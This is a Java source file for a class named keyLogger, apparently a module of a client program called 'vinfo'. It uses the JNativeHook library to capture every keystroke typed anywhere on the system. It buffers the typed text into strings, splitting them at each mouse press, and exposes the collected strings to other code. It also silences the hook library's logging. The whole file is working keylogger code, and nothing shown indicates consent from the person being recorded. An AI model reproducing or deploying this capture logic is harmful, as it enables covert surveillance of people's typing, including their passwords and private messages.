package fr.guedesite.vinfo.exceptions.trait;


import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;
import org.jnativehook.mouse.NativeMouseMotionListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

import fr.guedesite.vinfo.Boot;
import fr.guedesite.vinfo.interfaces.LoggerInstance;
import fr.guedesite.vinfo.interfaces.TraitementInstance;

public class keyLogger implements NativeKeyListener, NativeMouseListener, NativeMouseMotionListener, NativeMouseWheelListener, TraitementInstance {

	private LoggerInstance logger;
	
	private List<String> chaine;
	private String current = "";

	private ActivityChecker act;
	
	@Override
	public void init(LoggerInstance log) {
		this.logger = log;
		for(TraitementInstance t : ((fr.guedesite.vinfo.client)Boot.instance.getVersInstance()).getTraitements()) {
			if(t instanceof ActivityChecker) {
				this.act = (ActivityChecker) t;
			}
		}
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			log.tryPrint(this.getName(), "erreur", "impossible d'initialiser le keylogger: "+e.getMessage());
			log.err(e);
		}
		GlobalScreen.addNativeKeyListener(this);
		GlobalScreen.addNativeMouseListener(this);
		GlobalScreen.addNativeMouseMotionListener(this);
		GlobalScreen.addNativeMouseWheelListener(this);
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
		this.chaine = new ArrayList<String>();
	}

	@Override
	public void loop() {}

	@Override
	public String getName() {
		return "KeyLogger";
	}

	@Override
	public boolean hasToLoop() {
		return false;
	}

	@Override
	public boolean hasInfoToPrint() {
		return false;
	}

	@Override
	public String getInfoToPrint() {
		return null;
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
		update();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
		String keyText = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
		this.current += keyText;
		update();
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
		update();
	}

	@Override
	public void nativeMouseClicked(NativeMouseEvent nativeEvent) {
		update();
		
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent nativeEvent) {
		if(this.current.equals("")) {
			return;
		}
		this.chaine.add(this.current);
		this.current = "";
		update();
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent nativeEvent) {
		update();
		
	}
	
	
	public List<String> getChaine() {
		return this.chaine;
	}
	
	public void reset() {
		this.chaine.clear();
	}

	@Override
	public void nativeMouseMoved(NativeMouseEvent nativeEvent) {
		update();
		
	}

	@Override
	public void nativeMouseDragged(NativeMouseEvent nativeEvent) {
		update();
	}
	
	private void update() {
		this.act.update();
	}

	@Override
	public void nativeMouseWheelMoved(NativeMouseWheelEvent nativeEvent) {
		update();
		
	}
}